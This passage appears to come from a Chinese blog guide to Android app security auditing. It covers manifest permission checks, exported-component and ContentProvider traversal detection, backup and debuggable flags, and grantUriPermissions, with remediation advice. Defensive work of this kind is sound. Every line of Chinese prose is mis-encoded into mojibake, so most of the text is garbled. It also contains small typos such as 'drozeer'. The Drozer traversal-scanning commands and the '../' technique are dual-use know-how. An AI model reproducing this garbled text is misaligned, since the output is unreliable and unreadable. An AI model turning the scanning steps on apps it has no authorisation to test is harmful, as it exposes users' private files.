<p>å½“appå¦‚æœä½¿ç”¨äº†ä¸€äº›ç³»ç»Ÿé™åˆ¶æƒé™ï¼Œå¦‚<code>android.permission.WRITE_SECURE_SETTINGS`å’Œ`android.permission.INSTALL_PACKAGES</code>ï¼Œåˆ™åº”è¯¥æ˜¯ç³»ç»Ÿæˆ–è€…è°·æ­Œè‡ªå¸¦çš„appåº”ç”¨ï¼Œå¦åˆ™å°±æ˜¯ä¸€ä¸ªæ¶æ„çš„app</p>
<p>è‹¥appä½¿ç”¨ä¸‹è¿°æƒé™ï¼Œåˆ™appæœ‰è¾ƒé«˜çš„æƒé™ï¼Œè¦è°¨æ…ä½¿ç”¨</p>
<ul>
<li><code>android.permission.MOUNT_FORMAT_FILESYSTEMS</code></li>
<li><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></li>
<li><code>android.permission.RESTART_PACKAGES</code></li>
</ul>
<p>æ£€æµ‹<code>&lt;uses-permission&gt;</code>ä¸­æ˜¯å¦æ¶‰åŠä»¥ä¸‹æƒé™çš„ç”³è¯·ï¼Œè‹¥æœ‰å…¶ä¸­çš„<strong>ä»»ä½•ä¸€ä¸ªå­˜åœ¨</strong>ï¼Œåˆ™å°†è¯¥æ‰«æé¡¹æ ‡æ³¨ä¸ºæé†’ï¼Œå¹¶å°†åˆé—®é¢˜çš„ä»£ç æ®µæ ‡æ³¨å‡ºæ¥ã€‚</p>
<p><strong>å¯¹äºä¸Šè¿°æƒé™åŠŸèƒ½è¡¥å……</strong></p>
<ul>
<li>android.permission.WRITE_SECURE_SETTINGSï¼šå…è®¸åº”ç”¨ç¨‹åºè¯»å–æˆ–è€…å†™å…¥å®‰å…¨ç³»ç»Ÿè®¾ç½®</li>
<li>android.permission.INSTALL_PACKAGESï¼šå…è®¸ç¨‹åºå®‰è£…åº”ç”¨</li>
<li>android.permission.MOUNT_FORMAT_FILESYSTEMSï¼šå…è®¸ç¨‹åºæ ¼å¼åŒ–å¯ç§»åŠ¨æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯”å¦‚æ ¼å¼åŒ–æ¸…ç©ºsdå¡</li>
<li>android.permission.MOUNT_UNMOUNT_FILESYSTEMSï¼šå…è®¸ç¨‹åºæŒ‚è½½ï¼ŒåæŒ‚è½½å¤–éƒ¨æ–‡ä»¶ç³»ç»Ÿ</li>
<li>android.permission.RESTART_PACKAGESï¼šå…è®¸åº”ç”¨ç¨‹åºé‡å¯å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ä¸ªæƒé™é€šå¸¸åªå¯¹ç³»ç»Ÿåº”ç”¨å’Œç‰¹å®šçš„ç­¾ååº”ç”¨å¯ç”¨ï¼Œæ™®é€šåº”ç”¨æ— æ³•ä½¿ç”¨</li>
</ul>
<h3 id="AndroidManifestå±é™©ProtectionLevelæƒé™æ£€æµ‹">AndroidManifestå±é™©ProtectionLevelæƒé™æ£€æµ‹</h3>
<p>ç”±äº è‡ªå®šä¹‰çš„permissionçš„protectionLevelå±æ€§è®¾ç½®ä¸å½“ï¼Œä¼šå¯¼è‡´ç»„ä»¶æ•°æ®æ³„éœ²å±é™©ã€‚æœ€å¥½è®¾ç½®æƒé™ä¸º```signature<code>å’Œ</code>signatureOrSystem``ã€‚</p>
<p>æœªè®¾ç½®protectionLevelå±æ€§çš„æ—¶å€™é»˜è®¤ä¸ºnormalï¼Œè‹¥protectionLevelå±æ€§ä¸ºnormalæˆ–è€…æ˜¯dangerousæˆ–è€…æœªè®¾ç½®protectionLevelï¼Œå‡è®¤ä¸ºä¸å®‰å…¨ã€‚</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240919202911887.png" alt="image-20240919202911887"></p>
<h3 id="AndroidManifest-sharedUserId-æ£€æµ‹">AndroidManifest sharedUserId æ£€æµ‹</h3>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wotakuc/archive/2013/03/27/2984423.html">Android sharedUserIdç ”ç©¶è®°å½• - wotakuc - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é€šè¿‡sharedUserldå¯ä»¥è®©æ‹¥æœ‰åŒä¸€ä¸ªuser idçš„å¤šä¸ªapkè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹å½“ä¸­(è¿™ä¸ªsharedUseridå¯ä»¥éšä¾¿è®¾ç½®)ï¼Œäº’ç›¸è®¿é—®ä»»æ„èµ„æºã€‚sharedUseridè®¾ç½®ä¸º<code>android.uid.system</code>ï¼Œå¯ä»¥æŠŠappæ”¾åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œappå°†è·å¾—æå¤§çš„æƒé™ï¼Œå¦‚æœappåŒæ—¶æœ‰master keyæ¼æ´ï¼Œå®¹æ˜“è¢«root</p>
<p>å¦‚æœsharedUserIdè®¾ç½®ä¸º<code>android.uid.system</code>ä¸”appæœ‰master keyæ¼æ´ï¼Œåˆ™æ˜¯<code>é«˜å±</code>æ¼æ´ï¼›è‹¥æ²¡æœ‰master keyæ¼æ´ï¼Œåˆ™æ˜¯<code>æé†’</code></p>
<p>å…ˆæ£€æµ‹app/build.gradleä¸­çš„minSdkVersionï¼Œè‹¥ &lt;= 19ï¼Œåˆ™è¯´æ˜å…¶è¿è¡Œçš„ç³»ç»Ÿå¯èƒ½å­˜åœ¨mster keyæ¼æ´ï¼ˆAndroidç³»ç»Ÿ &lt;= 4.4ï¼Œå³API Level &lt;= 19å­˜åœ¨master keyæ¼æ´ï¼‰ã€‚æ­¤æ—¶è‹¥sharedUserIdè®¾ç½®ä¸º<code>android.uid.system</code>ï¼Œåˆ™æ ‡æ³¨ä¸º<code>é«˜å±</code>æ¼æ´ï¼›è‹¥minSdkVersion &gt;19 åˆ™æ˜¯æé†’ã€‚</p>
<p>å½“ç¨‹åºaå’Œç¨‹åºbä¸­å£°æ˜äº†åŒä¸€ä¸ªsharedUseridåï¼Œå¦‚æœbæƒ³è¦è·å–aç¨‹åºå½“ä¸­çš„ä¸€äº›èµ„æºï¼Œå¯ä»¥é€šè¿‡api  <strong>createPackageContext</strong>è·å–aç¨‹åºçš„contextï¼Œç„¶åè¿›ä¸€æ­¥è·å–açš„èµ„æºæˆ–æ•°æ®</p>
<h3 id="AndroidManifest-allowBackupæ£€æµ‹">AndroidManifest allowBackupæ£€æµ‹</h3>
<p>å½“API Level&gt;= 8æ—¶ï¼ˆå…¶å®å°äº8çš„APIç‰ˆæœ¬ç°åœ¨å·²ç»ç­ç»äº†ï¼‰ï¼ŒallowBackupè¿™ä¸ªæ ‡å¿—è¢«è®¾ç½®æˆtrueæˆ–<strong>ä¸è®¾ç½®è¯¥æ ‡å¿—ä½</strong>æ—¶ï¼Œåº”ç”¨ç¨‹åºæ•°æ®å¯ä»¥å¤‡ä»½å’Œæ¢å¤ï¼Œadbè°ƒè¯•å¤‡ä»½å…è®¸æ¶æ„æ”»å‡»è€…å¤åˆ¶åº”ç”¨ç¨‹åºæ•°æ®ã€‚</p>
<p>è‹¥è¦å¤‡ä»½ç¨‹åºçš„æ•°æ®ï¼Œå¯ä»¥é‡‡ç”¨è®¾ç½®è‡ªåŠ¨å¤‡ä»½ç¨‹åºçš„å‚æ•°<code>android:fullBackupContent=String</code>ï¼Œå¹¶æ·»åŠ ç›¸åº”çš„è§„åˆ™è¿›è¡Œé™åˆ¶ï¼Œè¿™ä¸ªè‡ªåŠ¨å¤‡ä»½ä¼šå°†ç”¨æˆ·ä¿ç•™åœ¨è®¾å¤‡ä¸­çš„æ•°æ®è‡ªåŠ¨ä¸Šä¼ è‡³ç”¨æˆ·çš„Google Driveè´¦æˆ·ã€‚åœ¨android 6.0å¼•å…¥çš„ï¼Œä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.my.appexample&quot;</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">    ...</span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/mybackupscheme&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>android:fullBackupContent</code>å±æ€§æŒ‡å®šäº†ä¸€ä¸ª XML æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åä¸ºmybackupscheme.xmlï¼Œä½äºåº”ç”¨å¼€å‘é¡¹ç›®çš„ res/xml/ ç›®å½•ä¸­ã€‚ æ­¤é…ç½®æ–‡ä»¶åŒ…æ‹¬å…³äºè¦å¤‡ä»½å“ªäº›æ–‡ä»¶çš„è§„åˆ™ã€‚ ä¸‹åˆ—ç¤ºä¾‹ä»£ç æ˜¾ç¤ºäº†å°†æŸä¸€ç‰¹å®šæ–‡ä»¶æ’é™¤åœ¨å¤‡ä»½ä¹‹å¤–çš„é…ç½®æ–‡ä»¶ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">full-backup-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">domain</span>=<span class="string">&quot;database&quot;</span> <span class="attr">path</span>=<span class="string">&quot;device_info.db&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">full-backup-content</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="AndroidManifest-Debuggableæ£€æµ‹">AndroidManifest Debuggableæ£€æµ‹</h3>
<p>åœ¨AndroidManifest.xmlä¸­å®šä¹‰Debuggableé¡¹ï¼Œå¦‚æœè¯¥é¡¹è¢«æ‰“å¼€ï¼Œappå­˜åœ¨è¢«æ¶æ„ç¨‹åºè°ƒè¯•çš„é£é™©ï¼Œå¯èƒ½å¯¼è‡´æ³„éœ²æ•æ„Ÿä¿¡æ¯ç­‰é—®é¢˜ã€‚é»˜è®¤å€¼ false</p>
<p>é£é™©ç­‰çº§ï¼š<code>é«˜å±</code></p>
<h3 id="éå¿…è¦æƒé™æ£€æµ‹">éå¿…è¦æƒé™æ£€æµ‹</h3>
<p>æ£€æµ‹åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸å¿…è¦ä½¿ç”¨çš„æƒé™</p>
<ul>
<li><code>android.permission.ACCESS_MOCK_LOCATION</code>è¯¥æƒé™æ˜¯ä½¿åœ¨æ¨¡æ‹Ÿå™¨ä¸­ä½¿ç”¨ï¼Œç”¨äºè·å–æ¨¡æ‹Ÿå®šä½ä¿¡æ¯ï¼Œå®‰è£…åœ¨ç”¨æˆ·æ‰‹æœºä¸­çš„åº”ç”¨ä¸åº”è¯¥ç”³è¯·è¯¥æƒé™ã€‚</li>
</ul>
<p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p>
<h3 id="appæœ€ä½ç‰ˆæœ¬æ£€æŸ¥">appæœ€ä½ç‰ˆæœ¬æ£€æŸ¥</h3>
<p>ç½—åˆ—å‡ºè·Ÿæœ€ä½ç‰ˆæœ¬ç›¸å…³çš„æ¼æ´å’Œbugï¼Œæé†’å¼€å‘è€…æ³¨æ„è‡ªå·±åº”ç”¨æ”¯æŒçš„æœ€ä½ç‰ˆæœ¬çš„ç³»ç»Ÿå¯èƒ½å­˜åœ¨çš„é—®é¢˜</p>
<p>æ£€æµ‹app/build.gradleä¸­çš„minSdkVersionç¡®å®šAPPæ‰€æ”¯æŒçš„æœ€ä½ç‰ˆæœ¬çš„ç³»ç»ŸAPIï¼Œå¯¹åº”åˆ°ç›¸åº”çš„Androidç‰ˆæœ¬ä¸Šã€‚</p>
<h2 id="ç»„ä»¶å®‰å…¨æ£€æµ‹">ç»„ä»¶å®‰å…¨æ£€æµ‹</h2>
<h3 id="Activityç»„ä»¶å¯¼å‡ºæ£€æµ‹">Activityç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3>
<p>Activityç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼šæé†’</p>
<p><strong>æ£€æµ‹è§„åˆ™ ï¼š</strong></p>
<ol>
<li>å…ˆæ£€æŸ¥ç»„ä»¶çš„android:exportedå±æ€§çš„å€¼ï¼Œè‹¥ä¸ºtrueæˆ–è€…æœªè®¾å®šè¯¥å±æ€§çš„å€¼ï¼Œåˆ™ç»§ç»­ç¬¬äºŒæ­¥æ“ä½œï¼›è‹¥ä¸ºfalseï¼Œåˆ™æ˜¯å®‰å…¨çš„</li>
<li>è‹¥ç»„ä»¶å«æœ‰æ ‡ç­¾ï¼Œå³ä½¿æœªè®¾ç½®exportedå±æ€§ï¼Œé»˜è®¤ä¹Ÿä¼šè®¾ç½®ä¸ºtrueï¼Œè‹¥ç»„ä»¶ä¸å«æœ‰æ ‡ç­¾ï¼Œåˆ™æœªè®¾ç½®exportedå±æ€§å€¼ï¼Œé»˜è®¤ä¼šè®¾ç½®ä¸ºtrueï¼Œå¦‚æœæ˜¯falseåˆ™æ˜¯å®‰å…¨çš„ï¼Œè‹¥æ˜¯trueï¼Œåˆ™è¿›è¡Œç¬¬ä¸‰æ­¥</li>
<li>åˆ¤æ–­android:permissionå±æ€§çš„å€¼ï¼Œç©ºï¼Œnormalï¼Œdangerousæ˜¯ä¸å®‰å…¨çš„ï¼Œsignatureã€signatureOrSystemæ˜¯å®‰å…¨çš„ã€‚</li>
</ol>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li>
<li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li>
<li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li>
</ul>
<h3 id="serviceç»„ä»¶å¯¼å‡ºæ£€æµ‹">serviceç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3>
<p>Serviceç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š <code>æé†’</code></p>
<p>æ£€æµ‹è§„åˆ™ï¼š</p>
<p>è§„åˆ™åŒ1</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li>
<li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li>
<li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li>
</ul>
<h3 id="Receiverç»„ä»¶å¯¼å‡ºæ£€æµ‹">Receiverç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3>
<p>Receiverç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»ã€‚</p>
<p>é£é™©ç­‰çº§ï¼š <code>æé†’</code></p>
<p>æ£€æµ‹è§„åˆ™ï¼š</p>
<p>è§„åˆ™åŒ1</p>
<p>å»ºè®®ï¼š</p>
<ul>
<li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li>
<li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li>
<li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li>
</ul>
<h3 id="Providerç»„ä»¶å¯¼å‡ºæ£€æµ‹">Providerç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3>
<p>providerç»„ä»¶å¯¼å‡ºå¯èƒ½ä¼šå¸¦æ¥ä¿¡æ¯æ³„éœ²éšæ‚£ã€‚API Levelåœ¨17ä»¥ä¸‹çš„æ‰€æœ‰åº”ç”¨çš„<code>android:exported</code>å±æ€§é»˜è®¤å€¼ä¸ºtrueï¼Œ17åŠä»¥ä¸Šé»˜è®¤å€¼ä¸ºfalseã€‚</p>
<p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p>
<p>æ£€æµ‹è§„åˆ™ï¼š</p>
<p>è§„åˆ™åŒ1</p>
<p>å»ºè®®ï¼š</p>
<ul>
<li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li>
<li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹å¯¼å‡ºçš„providerç»„ä»¶è®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li>
<li>ç”±äºcontentprovideræ— æ³•åœ¨android2.2ï¼ˆAPI-8ï¼‰ç”³æ˜ä¸ºç§æœ‰ã€‚æ•…å»ºè®®å°†<code>minSdkVersion</code>è®¾ä¸º8ä»¥ä¸Šã€‚</li>
</ul>
<h3 id="ContentProviderç›®å½•éå†æ¼æ´æ£€æµ‹">ContentProviderç›®å½•éå†æ¼æ´æ£€æµ‹</h3>
<p>è¯¥æ¼æ´ç”±äºContent Providerç»„ä»¶æš´éœ²ï¼Œæ²¡æœ‰å¯¹è¿™ä¸ªç»„ä»¶è®¿é—®æƒé™è¿›è¡Œé™åˆ¶ä¸”å¯¹Uriè·¯å¾„æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…é€šè¿‡Content Providerå®ç°çš„OpenFileæ¥å£è¿›è¡Œæ”»å‡»ï¼Œé€šè¿‡<code>../</code>çš„æ–¹å¼è®¿é—®ä»»æ„çš„ç›®å½•æ–‡ä»¶ï¼Œé€ æˆéšç§æ³„éœ²</p>
<p><strong>æ£€æµ‹ç­‰çº§</strong>ï¼šæé†’</p>
<p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p>
<ol>
<li>æ‰¾åˆ°å¯¼å‡ºçš„providerç»„ä»¶</li>
<li>ä½¿ç”¨Androidå®‰å…¨åˆ†ææ¡†æ¶DrozeråŠ¨æ€åˆ†æAPKï¼Œéœ€è¦å®‰è£…å®‰å“æ¨¡æ‹Ÿå™¨ï¼ˆå®‰è£…äº†<em>Genymotion</em>ï¼ŒåŸºäºX86 + ARMæ”¯æŒåŒ…ï¼‰</li>
<li>ã€ä½¿ç”¨adb è¿›è¡Œç«¯å£è½¬å‘ï¼Œè½¬å‘åˆ°Drozerä½¿ç”¨çš„ç«¯å£31415<br>
adb forward tcp:31415 tcp:31415</li>
<li>åœ¨å®‰å“è®¾å¤‡ä¸Šå¼€å¯Drozer Agent åœ¨PCä¸Šå¯åŠ¨Drozer<br>
<code>drozeer console connect</code></li>
<li>åœ¨Drozeræ§åˆ¶å°ä¸­ä½¿ç”¨å‘½ä»¤ï¼Œåˆ†æç›®æ ‡apkæ˜¯å¦å­˜åœ¨ç›®å½•éå†æ¼æ´<br>
<code>run scanner.provider.traversal -a &lt;package0-name&gt;</code></li>
</ol>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>
<p>å°†ä¸å¿…è¦çš„Connect Providerè®¾ç½®ä¸ºä¸å¯å¯¼å‡º</p>
</li>
<li>
<p>ç”±äºAndroidç»„ä»¶Content Provideræ— æ³•åœ¨Android 2.2(API Level 8)ç³»ç»Ÿä¸Šè®¾ç½®ä¸å¯å¯¼å‡ºï¼Œå› æ­¤å¦‚æœå¸Œæœ›Content Providerä¸å¯å¯¼å‡ºï¼Œå»ºè®®å£°æ˜çš„æœ€ä½SDKç‰ˆæœ¬ä¸º8ä»¥ä¸Šç‰ˆæœ¬ï¼›ç”±äºAPI Level 17ä»¥ä¸‹çš„æ‰€æœ‰åº”ç”¨çš„<code>android:exported </code>é»˜è®¤å€¼éƒ½ä¸ºtrueï¼Œå› æ­¤å¦‚æœåº”ç”¨çš„Content Providerä¸å¿…è¦å¯¼å‡ºï¼Œå»ºè®®æ˜¾ç¤ºè®¾ç½®æ³¨å†Œçš„Content Providerç»„ä»¶çš„<code>android:exported</code>å±æ€§ä¸ºfalseï¼›ã€</p>
</li>
<li>
<p>å»é™¤æ²¡æœ‰å¿…è¦çš„OpenFile()æ¥å£</p>
</li>
<li>
<p>å¦‚æœåº”ç”¨çš„Content Providerç»„ä»¶æ²¡æœ‰å¿…è¦å®ç°<code>openFile()</code>æ¥å£ï¼Œé˜¿é‡Œèšå®‰å…¨å»ºè®®ç§»é™¤è¯¥Content Providerçš„ä¸å¿…è¦çš„<code>openFile()</code>æ¥å£</p>
</li>
<li>
<p>è¿‡æ»¤é™åˆ¶è·¨åŸŸè®¿é—®ï¼Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­</p>
</li>
<li>
<p>ä½¿ç”¨<code>Uri.decode()</code>å…ˆå¯¹Content Query Uriè¿›è¡Œè§£ç åï¼Œåœ¨è¿‡æ»¤å¦‚å¯é€šè¿‡<code>../</code>å®ç°ä»»æ„å¯è¯»æ–‡ä»¶çš„è®¿é—®çš„Uriå­—ç¬¦ä¸²</p>
</li>
<li>
<p>è®¾ç½®æƒé™æ¥è¿›è¡Œå†…éƒ¨åº”ç”¨é€šè¿‡Content Providerçš„æ•°æ®å…±äº«</p>
</li>
<li>
<p>ä½¿ç”¨ç­¾åéªŒè¯æ¥æ§åˆ¶Content Providerå…±äº«æ•°æ®çš„è®¿é—®æƒé™ï¼Œå¦‚è®¾ç½®<code>protectionLevel=signatureæˆ–signatureOrSystem</code></p>
</li>
<li>
<p>æä¾›assetæ–‡ä»¶æ—¶æ³¨æ„æƒé™ä¿æŠ¤</p>
</li>
<li>
<p>å…¬å¼€çš„content providerç¡®ä¿ä¸å­˜å‚¨æ•æ„Ÿæ•°æ®</p>
</li>
</ul>
<h3 id="Providerï¼šgrant-uri-permissionå±æ€§æ£€æµ‹">Providerï¼šgrant-uri-permissionå±æ€§æ£€æµ‹</h3>
<p>grant-uri-permissionè‹¥è®¾ç½®ä¸ºtrueï¼Œå¯è¢«å…¶ä»–ç¨‹åºå‘˜é€šè¿‡uriè®¿é—®åˆ°content providerå†…å®¹ï¼Œå®¹æ˜“é€ æˆä¿¡æ¯æ³„éœ²ï¼Œé»˜è®¤æ˜¯false</p>
<p>å¦‚æœä¸€ä¸ªProvideræ˜¯éå¯¼å‡ºç»„ä»¶çš„æ—¶å€™ï¼Œå½“è¿›è¡Œæ–‡ä»¶å…±äº«çš„æ—¶å€™éœ€è¦åœ¨Intentä¸­åŠ å…¥Grantç›¸å…³çš„flags</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_READ_URI_PERMISSION = <span class="number">0x00000001</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_WRITE_URI_PERMISSION = <span class="number">0x00000002</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PERSISTABLE_URI_PERMISSION = <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PREFIX_URI_PERMISSION = <span class="number">0x00000080</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ ·startActivityå†…éƒ¨ä¼šåˆ¤æ–­ï¼Œå¦‚æœå«æœ‰è¿™äº›Grant flagï¼Œå°†ä¼šè¿›è¡Œä¸´æ—¶æ€§çš„Uriæˆæƒï¼Œä¹ŸåŒ…æ‹¬ä¸´çš„å°†providerç»„ä»¶exportç»™Intentçš„ç›®æ ‡åº”ç”¨ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼šæé†’</p>
<p><strong>é—®é¢˜å®ä¾‹ï¼š</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">	...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>å¦‚æ— éœ€å¯¹å¤–æä¾›æ•°æ®ï¼Œåˆ™å°†content providerçš„<code>android:grantUriPermissions</code>è®¾ç½®ä¸ºfalseã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">	...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>
